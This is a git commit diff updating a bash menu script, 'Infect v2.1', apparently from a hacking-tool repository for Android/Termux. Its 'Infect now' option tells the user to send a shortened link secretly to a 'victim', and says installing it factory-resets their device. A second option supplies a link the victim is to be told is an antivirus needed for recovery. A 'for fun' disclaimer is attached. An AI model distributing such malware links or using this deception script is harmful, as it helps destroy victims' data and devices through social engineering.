26da9362fd8f32a6ee90865836a3c4d5df2e1d15
N17R0 <49580304+noob-hackers@users.noreply.github.com>
2021-05-21 13:05:55 +0530

    Update infect.sh

--- infect.sh
+++ infect.sh
@@ -2,18 +2,18 @@
 # Be a unique person not copy cat
 # Colours
 #-----------------
-red='\033[1;31m'
-rset='\033[0m'
-grn='\033[1;32m'
-ylo='\033[1;33m'
-blue='\033[1;34m'
-cyan='\033[1;36m'
-pink='\033[1;35m'
+red="\e[91m"
+rset="\e[0m"
+grn="\e[92m"
+ylo="\e[93m"
+blue="\e[94m"
+cyan="\e[96m"
+pink="\e[95m"
 #-----------------
-# scripting starts
-clear
-echo '
-                
+# scripting start
+banner(){
+vid
+echo -e '\e[93m               
                          __________
                       .~#########%%;~.
                      /############%%;`\
@@ -25,129 +25,276 @@ echo '
       XX.....X     |##\____/##%;\____/.,|     X.....XX
  XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
 X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
-X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X
-X  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
- X# \.X        @#%,.@   Infect v1.2      @#%,.@        
+X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
+echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
+ X# \.X        @#%,.@   Infect v2.1      @#%,.@        
                 @#%,.@              @#%,.@          
                   @#%,.@          @#%,.@            
                      @#%,.@      @#%,.@             
                        @#%.,@  @#%,.@              
-                         noobhackers
-'|lolcat
+                        Noob Hackers
+'
 echo " " 
-
-echo -e "$red                      ▶ Coded by$grn N17RO$red ◀$rset"
-echo -e "$red                     ⫸$ylo  Noob Hackers$red ⫷$rset"
+echo -e "$red                       ▶Coded by$grn NITRO$red◀$rset"
+echo -e "$red                      ⫸$ylo  Noob Hackers$red ⫷$rset"
 echo 
 # Functions
-echo -e "$red                   [Infect them with fun]$rset"
+echo -e "$red                    [Infect them with fun]$rset"
 echo " "
 echo " "
-echo -e "$grn              ＞＞＞＞>>>＞$ylo [Options]$grn ＜<<<＜＜＜＜$rset"
+}
+baner1(){
+clear
+echo -e '\e[93m               
+                         __________
+                      .~#########%%;~.
+                     /############%%;`\
+                    /######/~\/~\%%;,;,\
+                   |#######\    /;;;;.,.|
+                   |#########\/%;;;;;.,.|
+          XX       |##/~~\####%;;;/~~\;,|       XX
+        XX..X      |#|  o  \##%;/  o  |.|      X..XX
+      XX.....X     |##\____/##%;\____/.,|     X.....XX
+ XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
+X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
+X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
+echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
+ X# \.X        @#%,.@   Infect v2.2      @#%,.@        
+                @#%,.@              @#%,.@          
+                  @#%,.@          @#%,.@            
+                     @#%,.@      @#%,.@             
+                       @#%.,@  @#%,.@              
+                        Noob Hackers
+'
+echo " " 
+echo -e "$red                       ▶Coded by$grn NITRO$red◀$rset"
+echo -e "$red                      ⫸$ylo  Noob Hackers$red ⫷$rset"
+echo 
+# Functions
+echo -e "$red                    [Infect them with fun]$rset"
 echo " "
 echo " "
-echo -e "$red                        ➡$cyan [1️⃣] Infect now"
-echo -e "$red                        ➡$cyan [2️⃣] Save now"
-echo -e "$red                        ➡️$cyan [3️⃣] Update script"
-echo -e "$red                        ➡$cyan [4️⃣] Exit"
+}
+menu(){
+echo -e "$grn             ＞＞＞＞>>>＞$ylo [Options]$grn ＜<<<＜＜＜＜$rset"
+echo " "
+echo " "
+echo -e "$red                        ➡$cyan [\e[92m1️\e[96m] Infect now"
+echo -e "$red                        ➡$cyan [\e[92m2\e[96m] Save now"
+echo -e "$red                        ➡$cyan [\e[92m3\e[96m] About"
+echo -e "$red                        ➡$cyan [\e[92m4\e[96m] Update script "
+echo -e "$red                        ➡$cyan [\e[92m5\e[96m] Subscribe"
+echo -e "$red                        ➡$cyan [\e[92m6\e[96m] More"
+echo -e "$red                        ➡$cyan [\e[92m7\e[96m] Chat"
+echo -e "$red                        ➡$cyan [\e[92m8\e[96m] Exit"
 echo " "
 echo " "
 echo -e "$grn               >＞＞＞＞＞$ylo [SELECT]$grn ＜＜＜＜＜<$rset"
 echo " "
-echo -e "$cyan                   [[[$ylo Select any option$cyan]]]$rset"
-echo " "
-read n
-case "$n" in
-1)echo " "
-echo " "
-echo " "
-echo -e "$red               You are going to$grn Infect$red Now$rset"
-echo " "
-echo -e "$grn                  Press$ylo ENTER$red to continue$rset"
-echo " "
-cd $HOME/infect/lol
-echo " "
-echo -e "$ylo     To terminate the process click$red 't'$ylo or to continue click on$grn ENTER$rset" 
-read choice
-if [ $choice = 't' ] ; then
-echo -e "$red                    Are you sure? Press$grn ENTER$red to exit$rset"
-cd $HOME/infect
-bash infect.sh
+echo -ne "\e[92m#SELECT OPTION\e[92m: "
+read optnz
+if [ $optnz = "1" ];
+then
+virus
+elif [ $optnz = "2" ];
+then
+save
+elif [ $optnz = "3" ];
+then
+about
+elif [ $optnz = "4" ];
+then
+subs
+elif [ $optnz = "5" ];
+then
+am start -a android.intent.action.VIEW -d https://bitly.com/nhytchannel > /dev/null 2>&1
+banner
+menu
+elif [ $optnz = "6" ];
+then
+am start -a android.intent.action.VIEW -d https://noob-hackers.github.io/noobspage > /dev/null 2>&1
+banner
+menu
+elif [ $optnz = "7" ];
+then
+am start -a android.intent.action.VIEW -d https://bitly.com/nhwhatschat > /dev/null 2>&1
+banner
+menu
+elif [ $optnz = "8" ];
+then
+exit 1
 else
-bash sysup.sh
-echo
-echo " "
-echo " "
-echo -e "$grn ＞＞＞＞＞＞＞＞＞$ylo [EXIT]$grn ＜＜＜＜＜＜＜＜＜$rset"
-echo " "
-echo -e "$cyan            click$grn ENTER$cyan to go back into infect  menu$rset"
-echo " "
+echo "wrong"
+exit
 fi
-cd $HOME/infect/
-bash infect.sh ;;
-2)echo " "
-echo " "
-echo " "
-echo -e "$red                You are going to$red Save victim$rset "
-echo " "
-echo -e "$grn                  Press$ylo ENTER$grn to continue$rset"
-echo " "
-cd $HOME/infect/lol
-echo " "
-echo -e "$ylo         To terminate the process click$red 't' $ylo or to continue click on$grn ENTER$rset"
-read choice
-if [ $choice = 't' ] ; then
-echo -e "$red                   Are you sure? Press$grn ENTER$red to exit$rset"
-cd $HOME/infect
-bash infect.sh
-else
-bash save.sh
-echo " "
-echo " "
-echo -e "$grn ＞＞＞＞＞＞＞$ylo [EXIT]$grn ＜＜＜＜＜＜＜＜＜$rset"
-echo " "
-echo -e "$cyan             click$grn ENTER$cyan to go back into infect  menu$rset"
-echo " "
-fi
-cd $HOME/infect
-bash infect.sh ;;
-3)echo " "
-echo " "
-echo " "
-echo -e "$red             You are going to$grn Update the$red Script$rset "
-echo " "
-echo -e "$grn                 Press$ylo ENTER$grn to continue$rset"
-echo " "
-cd $HOME/infect/lol
-echo " "
-echo -e "$ylo         To terminate the process click$red 't' $ylo or to continue click on$grn ENTER$rset"
-read choice
-if [ $choice = 't' ] ; then
-echo -e "$red                 Are you sure? Press$grn ENTER$red to exit$rset"
-cd $HOME/infect
-bash infect.sh
-else
-bash update.sh
-echo " "
-echo " "
-echo -e "$grn ＞＞＞＞＞＞＞＞$ylo [EXIT]$grn ＜＜＜＜＜＜＜＜＜$rset"
-echo " "
-echo -e "$cyan        click$grn ENTER$cyan to go back into infect  menu$rset"
-echo " "
-read punch
-fi
-cd $HOME/infect
-bash infect.sh ;;
-4)
-sleep 2.0
+}
+virus(){
+################
 clear
+echo
+echo -e '\e[92m 
+                    _  _  _____  ____  ____ 
+                   ( \( )(  _  )(_  _)( ___)
+                    )  (  )(_)(   )(   )__) 
+                   (_)\_)(_____) (__) (____) '
 echo " "
-echo -e "$grn
-     ____  _  _  ____    ____  _  _  ___
-    (  _ \( \/ )( ___)  (  _ \( \/ )( ___)
-     ) _ < \  /  )__)    ) _ < \  /  )__)
-    (____/ (__) (____)  (____/ (__) (____)...$cyan have a awesome day$rset"
+echo -e "\e[91m 😈  Copy below link and send it your victim and 
+say nothing to him. when he install it in his 
+device it will be factory reset and lot more happens.
+                                👇👇👇
 
+         \e[92mL1NK :- \e[96mhttps://bit.ly/3ild93L\e[91m
+
+                                 👆👆👆
+Use only for fun purpose not for harming someone 😇✌️.
+And our channel is not responsible for any kind of loss 
+you do to other's by this script."
+echo
+echo -ne "\e[92m#Type exit : "
+read exitz
+if [ $exitz = "exit" ];
+then
+banner
+menu
+else
+banner
+menu
+fi
+}
+save(){
+clear
+echo
+echo -e '\e[92m 
+                    _  _  _____  ____  ____ 
+                   ( \( )(  _  )(_  _)( ___)
+                    )  (  )(_)(   )(   )__) 
+                   (_)\_)(_____) (__) (____) '
 echo " "
 echo " "
-esac
+echo -e "\e[93m  Copy below link and send it your victim and tell him
+that he should install this application or else his 
+device will not be recovered.(Antivirus)
+                    👇👇👇
+
+        \e[92mL1NK :- \e[96mhttps://bit.ly/3fX8ljZ\e[93m
+
+                    👆👆👆
+Use only for fun purpose not for harming someone 😇✌️. 
+And our channel is not responsible for any kind of 
+loss you do to other's by this script."
+echo
+echo -ne "\e[92m#Type exit : "
+read exitz
+if [ $exitz = "exit" ];
+then
+banner
+menu
+else
+banner
+menu
+fi
+}
+about(){
+clear
+echo -e '\e[91m
+         ──▐─▌──▐─▌──
+         ─▐▌─▐▌▐▌─▐▌─
+         ─█▄▀▄██▄▀▄█─
+         ──▄──██▌─▄──
+         ▄▀─█▀██▀█─▀▄
+         ▐▌▐▌─▐▌─▐▌▐▌
+         ─▐─█────█─▌─
+         ────▌──▐────
+'
+echo -e "\e[93m                  CALL ME \e[92mNITRO" | pv -qL 10
+echo -e "\e[93m             IAM FROM \e[92mNOOB HACKERS" | pv -qL 10
+echo -e "\e[93m       IM A \e[92mGEEK\e[93m WITH LOTS OF EXCITEMENT" | pv -qL 10
+echo -e "\e[93m             HOPE YOU LIKE THIS SCRIPT" | pv -qL 10
+echo -e "\e[93m         OOPS... I TALK A LOT SRY FOR THAT " | pv -qL 10
+echo -e "\e[93m              JOIN GROUPS ON \e[92mWHATS' APP" | pv -qL 10
+echo -e "\e[93m        MY WEBSITE:\e[92m www.noob-hackers.com\e[0m" | pv -qL 10
+echo -e "\e[92m                BYEE.............." | pv -qL 10
+sleep 6.0
+banner
+menu
+}
+upd(){
+if [ -d "$HOME/infect"];
+then
+cd $HOME
+rm -rf infect
+elif [ -d "$HOME/Infect"];
+then
+cd $HOME
+rm -rf Infect
+else
+echo
+exit 1
+fi
+cd $HOME
+sleep 1
+echo -e "         \e[96mUPDATE IS GOING ON, PLEASE WAIT FOR A WHILE...!\e[0m"
+echo
+printf "                     \e[96m["
+# While process is running...
+while git clone https://github.com/noob-hackers/infect 2> /dev/null; do 
+    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
+    sleep 1
+done
+printf "\e[96m]\e[0m"
+echo
+echo
+echo
+printf "\e[96m                    UPDATE SUCCESSFULL (LATEST VERSION)..!\e[0m"
+sleep 2.0
+cd $HOME
+cd infect
+bash infect.sh
+}
+vid(){
+FILE=/home/runner/brunko/infect/noob.noob
+if [ -f "$FILE" ]; then
+pop
+else
+echo
+fi
+}
+pop(){
+clear
+echo -e "\e[96m                ╔═══════════════════════════════════╗\e[0m"
+echo -e "\e[96m                ║  \e[93mHAI, I JUST UPLOADED NEW\e[96m VIDEO   ║\e[0m"
+echo -e "\e[96m                ║      WATCH NEW VIDEO NOW.....!    ║\e[0m"
+echo -e "\e[96m                ║                                   ║\e[0m"
+echo -e "\e[96m                ║        Select \e[92my\e[96m to watch\e[96m          ║\e[0m"
+echo -e "\e[96m                ║                (\e[93mOR\e[96m)               \e[96m║\e[0m"
+echo -e "\e[96m                ║        Select \e[91mt\e[96m to cancel\e[96m         ║\e[0m"
+echo -e "\e[96m                ║                (\e[93mOR\e[96m)               \e[96m║\e[0m"
+echo -e "\e[96m                ║     Select \e[91mz\e[96m to skipforever\e[96m       ║\e[0m"
+echo -e "\e[96m                ╚═══════════════════════════════════╝\e[0m"
+echo -en "\e[32mSELECT OPTION [\e[93my/\e[93mt/\e[32m\e[93mz\e[32m]: \e[0m "
+read p
+if [ "$p" = "y" ];
+then
+am start -a android.intent.action.VIEW -d https://noobhacktube.com 2>/dev/null
+clear
+baner1
+menu
+elif [ "$p" = "t" ];
+then
+clear
+baner1
+menu
+elif [ "$p" = "z" ];
+then
+cd /home/runner/brunko/infect
+rm noob.noob
+banner
+menu
+else
+banner
+menu
+exit
+fi
+}
+banner
+menu
